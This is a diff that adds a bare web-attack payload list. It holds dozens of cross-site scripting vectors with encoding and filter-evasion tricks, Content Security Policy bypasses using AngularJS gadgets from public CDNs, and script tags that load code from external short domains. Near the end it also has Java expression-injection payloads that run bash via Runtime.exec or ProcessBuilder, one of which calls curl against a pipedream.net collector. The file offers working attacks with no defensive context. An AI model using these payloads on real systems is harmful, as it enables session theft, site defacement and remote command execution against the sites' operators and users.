@@ -1,0 +1,181 @@
+<A/hREf="j%0aavas%09cript%0a:%09con%0afirm%0d``">z
+<d3"<"/onclick="1>[confirm``]"<">z
+<d3/onmouseenter=[2].find(confirm)>z
+<details open ontoggle=confirm()>
+<w="/x="y>"/ondblclick=`<`[confir\u006d``]>z
+<a href="javascript%26colon;alert(1)">click
+<a href=javas&#99;ript:alert(1)>click
+<script/"<a"/src=data:=".<a,[8].some(confirm)>
+<svg/x=">"/onload=confirm()//
+<--`<img/src=` onerror=confirm``> --!>
+<svg%0Aonload=%09((pro\u006dpt))()//
+<sCript x>(((confirm)))``</scRipt x>
+<svg </onload ="1> (_=prompt,_(1)) "">
+<embed src=//14.rs>
+<iframe/src \/\/onload = prompt(1)
+<x oncut=alert()>x
+<svg onload=write()>
+<script y="><">/*<script* */prompt()</script
+<script x=">" src=//15.rs></script>
+<!'/*"/*/'/*/"/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>
+<!--><script src=//14.rs>
+
+&ltsvgonloadconfirm`1`%26gt;@x.y
+
+
+lapz"><imgsrc=xonerror=alert('sysadmin')>
+"&gt;&ltimg/src/onerror=alert('Baseline')&gt;
+XSS">&ltimg src=x onerror=alert('XSS')>
+&ltimg src=x onerror=alert('XSS')&gt;
+&ltimg src=x onerror=alert`'XSS'`&gt;
+&ltimg/src/onerror=alert('XSS')>
+&#x3c;img/src/onerror=alert('XSS')>
+"><img src=x onerror=alert('USERB')>
+%26ltimg%20src=x%20onerror=alert('XSS')%26gt;
+%26ltimg src=x onerror=alert('XSS')%26gt;
+\">&#x3c;img src=x onerror=alert('task')>  
+
+&ltimg src=x onerror=alert('XSS')&gt;
+
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
+
+HTML Encode:
+
+* Named Entities
+&lt;img src=x onerror=alert('HtmlNamedEntities')&gt;
+
+* Numeric Entities
+
+&#60;img src=x onerror=alert('HtmlNumericEntities')&#62;
+
+* Hex Entities
+&#x3c;img src=x onerror=alert('HTMLHexEntities')&#x3e;
+
+
+<A%20%252F=""Href=%20JavaScript:k=%27a%27,top[k%2B%27lert%27](origin)>
+<A /=""Href= JavaScript:k='a',top[k 'lert'](origin)>
+<A %2F=""Href= JavaScript:k='a',top[k+'lert'](origin)>
+
+">'><object type="application/x-shockwave-flash" data='https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js'>
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+
+USERB = 5131811
+
+\"><img src=x onerror=alert('USERB')>
+
+
+//j%5c%5cjavascript%3aalert()
+//ja%5C%20javascript%0a:alert()
+
+<object data="data:text/html,<script>alert('XSS')</script>"></object>
+${333*2} ${{333*3}} <%= 444*2 %><img src=x onerror=alert('issue')>
+
+//j%5c%5cjavascript%3aalert()
+
+
+//ja%5C%20javascript%0a:alert()
+
+javascript:alert('xxx')
+javascript:print("//http:")
+javascript:print("//https:")
+
+ http://javascript:alert('xxx')
+
+Url = https://brutelogic.com.br/poc.svg
+
+## googleapis Bypass
+
+object-src
+
+<object data="https://brutelogic.com.br/poc.svg">
+
+">'><object type="application/x-shockwave-flash" data='https://ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//'>
+
+">'><object type="application/x-shockwave-flash" data='//㊺.₨'>
+<script src=//㊺.₨>
+
+## CloudFlare
+
+"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+
+Lin<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script> <div ng-app ng-csp> {{$on.curry.call().alert('xss')}} </div>
+
+Link<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script> <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script> <div ng-app ng-csp> {{[].erase.call().alert('xss')}} </div>
+
+Duplicate"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script> <div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
+
+inWard CloneClone<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script> <div ng-click="$event.path|orderBy:'alert(1)'">test</div>
+
+
+Email = "hello<form/><!><details/open/ontoggle=alert(1)>"@gmail.com
+Email = "><svg/onload=confirm(1)>"
+
+
+Without space = "><svg/onload=alert('xss')>
+
+without space = <img/src/onerror=alert('XXX')>
+
+{{7*"7"}}"><img src=x onerror=alert(12)>
+
+<img src=x onerror=alert(document.cookie)>
+
+#tag ( "Hidden" name="queryString" value="''+#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl https://eojjvbt09aaka4m.m.pipedream.net")}+''" )
+
+
+aaa\u0027%2b#{\u0022\u0022[\u0022class\u0022].forName(\u0022javax.script.ScriptEngineManager\u0022).newInstance().getEngineByName(\u0022js\u0022).eval(\u0022var x=new java.lang.ProcessBuilder;x.command([\u0027/bin/bash\u0027,\u0027-c\u0027,\u0027'.$cmd.'\u0027]);x.start()\u0022)}%2b\u0027
+
+aaa'+ #{ ""["class"].forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("var x=new java.lang.ProcessBuilder;x.command(['/bin/bash','-c','curl domain/$(https://eojjvbt09aaka4m.m.pipedream.net)']);x.start()"); } +'
+
+project = "<img src=x onerror=alert('XSSDXC')>"
+
+"><img src=x onerror=alert('xss')>
+
+<img src='1' onerror='alert(0)' <
+
+"><a/href=data:text/html;base64,JTNDaW1nL3NyYz14L29uZXJyb3I9YWxlcnQlNjAneHNzJyU2MCUzRQ==>Clickme</a>
+
+<a href="<script>alert(8007)</script>">Click Me</a>
+
+<a href=javascript:alert('xxx')>Click Me</a>
+
+"><img/src/onerror=alert('xx')>
+
+<script>alert('aa')</script>
+
+<script src=dd.io>
+
+"><iframe/src="javascript:alert('xxx')">
+
+"><iframe src="javascript:alert('xxx')">
+
+"><iframe src=//㊺.₨>
+
+"><iframe/src=https://brutelogic.com.br/poc.svg>
+
+"><iframe src=//㊺.₨>
+
+<iframe/src=//l❤️.io>
+
+<svg/onload=alert(document.domain)>
+
+<svg/onload=alert('xss')>
+
+<img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+CiAgICA8Zm9yZWlnbk9iamVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIj4KICAgICAgICA8c2NyaXB0PmFsZXJ0KGRvY3VtZW50LmRvbWFpbik7PC9zY3JpcHQ+CiAgICA8L2ZvcmVpZ25PYmplY3Q+Cjwvc3ZnPg==">
+
+<script>alert('Object')</script>
+
+<script src=//clnd.io></script>
+
+<script src=//㊺.₨>
+
+<script src=//㏄㏛.pw>
+
+<img/src=//🤣.io>
+
+<img/src='//x.me
+
+<script/src=//㎠.㎺>
+
+<svg onload=alert()>
+
+JQL = project = "\"><img src=x onerror=alert('managementIT')>" 
